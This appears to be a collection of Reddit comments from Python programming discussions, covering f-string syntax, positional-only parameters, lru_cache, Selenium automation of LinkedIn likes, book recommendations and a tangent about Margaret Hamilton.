Given that this month marks the 50th anniversary of humans landing on the moon, Margaret Hamilton is definitely someone I respect. She said in [a TIME interview four years ago about the landing](https://time.com/3948364/moon-landing-apollo-11-margaret-hamilton/): &gt;I remember thinking, *Oh my God, it worked.* I was so happy. But I was more happy about it working than about the fact that we landed. which resonates with programmers to this very day.

I was dating a girl who was sort of an activist type and it came up, don't remember exactly how. Probably something from twitter üôÉ At least she was happy with me in the end because I can go on a *rant* about how intensely unjust the British Government was towards Turing, or the story about the provenance of the word 'bugs' and Grace Hopper's groundbreaking work. My close friends group is a little more homogeneous, but I hang out with all sorts of people in DC (i.e. often very progressive types). I definitely don't know Margaret Hamilton's story as well as I should ([but this picture I know of](https://en.wikipedia.org/wiki/File:Margaret_Hamilton_-_restoration.jpg)) -- can't imagine the pressure of writing that code. That reminds me: you remember the black hole imaging thing from a few months ago, right? It's that kind of stuff too that can get my goat, although at least in that case Dr. Bouman definitely had a great ted talk -- but I don't see why the social media mob had to take sweep the team under the rug to put her on a pedestal. Of all things to toss into the culture wars grinder.
Yeah that's like the only reason I want them.
Technically, `lru_cache` is not a decorator, it's a callable that returns a decorator.

Why would someone want to know the temperature of the crib? Any modern AC would keep the temperature of the room in a fairly narrow range.
I suspect you could convert this to using signal-cli. The difference being you would need probably dedicated SIM with contract to use as the identity for signal. I don't think it necessarily needs to be attached though. The Haven project uses signal in a similar way. https://guardianproject.info/apps/org.havenapp.main/

I'm not trying to be confrontational, but you're complaining about a feature which you don't fully understand.. print(f"valone+valtwo") does not evaluate anything so what you'd get is just the string "valone+valtwo". To evaluate the values you need to put them inside {}, like print(f"{valone+valtwo}") What /u/GiuTinTom is saying, is that the equals has be **outside**, he never said to specify it as a separate non-f-string: print(f"{valone+valtwo}=")
Oh, no, don't misunderstand me! I don't think anyone is being confrontational! I think this article is super misleading AND I think I'm misunderstanding stuff, lol. The example they're using in the article states: print(f'{input-output=}') Would print 100-50=50. That sort of implies that the equals sign is evaluating stuff inside of the fstring, doesn't it? Bit... it also sort of implies that it is outputting the equals sign too? You know what? This article sucks.
This is a horrible article. There are multiple mistakes that indicate that the author is lacking some very basic knowledge about Python. Reversed has existed forever. lru_cache has always been a decorator, it even says so in the official docs. Both of these only received minor changes.
What is the purpose for positional-only parameters? I can not imagine anything, besides intentionally annoying other programmers in your project.

There are several Cybrary and Udemy courses on pentesting/hacking. There are also some good books on the topic. *Blackhat Python* and *Violent Python* are two notable titles. I have not read any others, however, but I can attest those two are pretty good; although it is worth mentioning that both titles reference Python 2, unless there have been revised editions that include Python 3.
Thanks. I will try that.
hi. I'm looking for something similar to this (liking and sharing company's posts whenever there is one available). I was wondering what method did you use and if you could share your code?
Well good luck this time :) The book you mentioned, Crash course? I looked it up and it seems like a pretty solid book. Once you get all the basics / fundamentals down, I'm sure you'll have a good time with the projects.

I used selenium and pygui to pretty much work through a browsing session. Tied up the machine but worked pretty clean. Have to open up the elements and expose the correct ones so you can verify if the like is set to true or false and click exactly where the elements are to toggle them. Liking was easy but sharing can be trickier because the additional window that come up you have to peel back to those elements as well. I think I only have an older version of the code on hand in an email. Real files at home so won't have access until later.
&gt;I've asked "experts" to explain why the market rises and falls. Every other commodity market can do so. The dollar fell to the yen overnight? You bet there's a reason given. GM stock is up 10% overnight? Not hard to find out why. Unless they can predict these ahead of time (or perhaps retroactively, given the trigger, but not the result), I suspect these are developed with 20/20 hindset, and are untestable.
Thanks for the gold! Its always the most off-hand posts that fare the best.

I made this mostly because I wanted to learn how to use pytest, tox, GitLab CI/CD and all that kind of stuff, and I learned a lot! So it's basically a hook system, as simple as possible.

I'd recommend the book: (Python GUI Programming with Tkinter: Develop responsive and powerful GUI applications with Tkinter) if you're new to programming and python. Its straight and to the point. I used it and a few online tutorials about the sqlite3 library and made a program similar to what you're looking for. all in all I had the program up in working in a few days. I started out looking into QT as well but its pretty advanced for a beginner in my humble opinion. At least trying to make sense of the code once you've compiled the GUI. Though I've heard good things about Kivy and Pysimplegui, just never used them.
Interesting. I was thinking about selenium as well. Not sure if there is already some linkedin API that can do this. A quick search on google doesn't give anything. This might be my next python project.
Only thing I could dig up in regards to an API was more about returning information. Nothing really seemed prepared to be able to interact with the platform. Was a fun project to do and was an eye opener in how python can interact with HTML. My HTML wasn't strong at the start so that was then steepest learning curve for me.

When I was working with a company that worked with Chose and Book (back in 2007), everything was .NET. TBH I am glad that they have moved to python. I am a C# / [VB.NET](https://VB.NET) guy and the problem with a lot of .NET solution / .NET programmers in my experience is that they don't really go outside of Microsoft for ideas. So what could have been quite simply with a few open source libraries you normally get this bodged together approximation of an open source lib.

You should probably switch to scripts. &amp;#x200B; Depending on what your project is doing, you may be able to make it faster with some combination of the following: &amp;#x200B; 1. Using threads to parallelize network requests / downloads 2. Using optimized numerical libraries that can parallelize workload behind the scenes 3. Breaking your project into multiple small scripts that each read and write one file, then tying those together with some kind of scheduler or running them in a terminal Either way, it sounds like you've outgrown notebooks.

Have you read the PEP? I was against the idea myself untill I read it and changed stance completely. An example where it would be appropriate is if you want to create an API that does something generic like create a new NumPy array like object. At first you might only support constructing the array with a list, so you name the first attribute ``list_of_nunbers``. Now say you update this library and you suddenly support any iterable, using the variable name ``list_of_numbers`` is no longer ideal, however, you cannot change its name since it might be set using keyword arguments in someone's codebase. By setting ``list_of_numbers`` to positional only you ommit this problem completely.

I can't understand 1-3 making it in to python, I thought one of the design principles of the language was to avoid random unreadable symbols?
I don't see how it solves the problem. Changing function to "positional arguments only" will force the users of the function to rewrite the call the same way as renaming the key would. It seems to be a problem that is easy to foresee and prevent. Even if I did that mistake, I'd just create a new keyword argument `iterable_of_numbers` (bad naming here, but still), make it and `list_of_numbers` do the same thing, and make `list_of_numbers` deprecated until some major rework, when I could delete it completely.

Rather than complaining here (no offense, but it's true), I decided to contact the author through the email he had provided at the bottom of the article. He has now fixed all the issues he found based on your feedback.
&gt; Changing function to "positional arguments only" will force the users of the function to rewrite the call the same way as renaming the key would. I believe the idea was that you can use positional argument from the get go without having to worry about whether you'll update it in the future or not. It is quite troublesome to have two arguments do the same thing.
I‚Äôm not sure how you could expect a definitive answer here because it ‚Äúdepends‚Äù. I‚Äôm not talking leakage protection here eitherü§™. In some cases simply using Python for large dataset processing is a mistake. When Python is the right choice, it might benefit you to run several processes (assuming a real OS here). Or you may want to use threading facilities from within Python itself. Finally there is always the possibility of preprocessing the data with system tools, but of course that depends upon what you are doing. Effectively there are likely a hundred potential approaches here that would be considered normal practice. What you need to do is to understand the data and the processing to be performed and try to fit the best method to the project. Testing could be important here because running too many processes / threads could actually slow things down.
I contacted the author and it should be fixed now! :)
